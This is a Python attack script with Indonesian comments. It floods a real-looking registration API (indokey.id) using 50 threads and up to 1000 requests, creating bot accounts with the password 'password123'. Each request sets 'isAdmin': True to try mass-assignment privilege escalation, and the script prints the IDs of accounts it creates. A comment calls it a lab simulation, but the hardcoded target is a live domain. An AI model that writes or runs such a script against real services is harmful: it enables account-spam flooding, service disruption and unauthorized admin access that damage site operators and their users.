import requests
import json
import itertools
from concurrent.futures import ThreadPoolExecutor

# URL Endpoint Target (Ganti dengan URL server simulasi lokal Anda)
URL_TARGET = 'https://indokey.id/backend/api/auth/register.php'

# Konfigurasi Concurrency untuk Simulasi Lab
JUMLAH_THREAD = 50
MAKSIMAL_REQUEST = 1000

def kirim_request_bot(data_kombinasi):
    nomor_urut, item = data_kombinasi
    string_acak = "".join(item)
    
    username = f"Nusant1ara_{string_acak}"
    email = f"Nusant1ara_{string_acak}@gmail.com"
    
    payload = {
        'username': username,
        'email': email,
        'password': 'password123',
        'isAdmin': True
    }
    
    headers = {
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.post(URL_TARGET, data=json.dumps(payload), headers=headers, timeout=5)
        
        # Mengubah respons teks menjadi objek JSON/Dictionary Python
        data_json = response.json()
        
        # Cek jika properti 'success' bernilai True sesuai respons di gambar
        if data_json.get("success") == True:
            user_info = data_json.get("user", {})
            user_id = user_info.get("id", "N/A")
            
            print(f"[+] Akun {nomor_urut} SUKSES!")
            print(f"    -> ID       : {user_id}")
            print(f"    -> Username : {user_info.get('username')}")
            print(f"    -> Email    : {user_info.get('email')}")
            print(f"    -> Created  : {user_info.get('createdAt')}\n")
        else:
            print(f"[-] Akun {nomor_urut} GAGAL (Respon Server: {data_json})\n")
            
    except json.JSONDecodeError:
        # Antisipasi jika server tidak mengembalikan format JSON (misal error 500 html)
        print(f"[-] Akun {nomor_urut} GAGAL: Respon bukan JSON. Teks: {response.text[:100]}\n")
    except requests.exceptions.RequestException as e:
        print(f"[-] Akun {nomor_urut} GAGAL: Kendala Jaringan ({e})\n")

def main():
    karakter = "abcdefghijklmnopqrstuvwxyz0123456789"
    kombinasi_generator = itertools.product(karakter, repeat=6)
    
    antrean_tugas = list(enumerate(itertools.islice(kombinasi_generator, MAKSIMAL_REQUEST), start=1))
    
    print(f"[+] Memulai simulasi dengan {JUMLAH_THREAD} thread...")
    print(f"[+] Menjalankan total {len(antrean_tugas)} antrean tugas...\n")
    
    with ThreadPoolExecutor(max_workers=JUMLAH_THREAD) as executor:
        for tugas in antrean_tugas:
            executor.submit(kirim_request_bot, tugas)

if __name__ == "__main__":
    main()
